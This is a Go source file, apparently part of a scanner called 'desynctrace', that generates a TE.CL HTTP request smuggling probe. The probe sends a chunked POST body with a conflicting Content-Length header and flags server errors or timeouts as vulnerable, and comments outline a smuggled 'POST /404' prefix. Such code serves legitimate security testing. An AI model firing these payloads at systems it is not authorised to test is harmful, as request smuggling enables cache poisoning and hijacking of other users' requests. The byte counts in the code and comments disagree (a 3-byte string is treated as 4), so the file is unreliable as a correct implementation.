package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

type TECLVector struct{}

func NewTECLVector() *TECLVector {
	return &TECLVector{}
}

func (v *TECLVector) Name() string {
	return "TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)"
}

func (v *TECLVector) Type() VectorType {
	return TECL
}

func (v *TECLVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// Basic TE.CL payload
	// Frontend sees Transfer-Encoding: chunked, parses chunks.
	// Backend see Content-Length: 4 (for example), reads "12\r\n", leaves rest.

	// Body:
	// 5e\r\n
	// POST /404 HTTP/1.1\r\n
	// Host: vulnerable-website.com\r\n
	// Content-Length: 15\r\n
	// \r\n
	// x=1\r\n
	// 0\r\n
	// \r\n

	// Frontend reads all chunks (5e bytes + 0 chunk).
	// Backend reads explicit Content-Length (e.g., 4 bytes: "5e\r\n") and stops.
	// The rest "POST /404 ..." is recognized as the start of the next request.

	// smuggledReq := "POST /404 HTTP/1.1\r\n" +
	// 	"Host: " + baseReq.Host + "\r\n" +
	// 	"Content-Length: 10\r\n\r\nx="

	// chunkSizeStr := strings.TrimSpace(smuggledReq) // Just simplistic here, real calc needed
	// For TE.CL, we structure it as a valid chunk from FE perspective.

	// Simplified PoC payload
	body := "8\r\n" + // Chunk size
		"SMUGGLED\r\n" +
		"0\r\n" +
		"\r\n"

	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		},
		TransferEncoding: "chunked",
		Body:             []byte(body), // Client should NOT re-chunk this if we said it's chunked?
		// We explicitly set Content-Length to 4 (length of "8\r\n") for the Backend
		ContentLength: 4,
	}

	payloads = append(payloads, req1)

	return payloads
}

func (v *TECLVector) Verify(resp *client.Response) bool {
	if resp.StatusCode >= 500 || resp.Duration.Seconds() > 5 {
		return true
	}
	return false
}
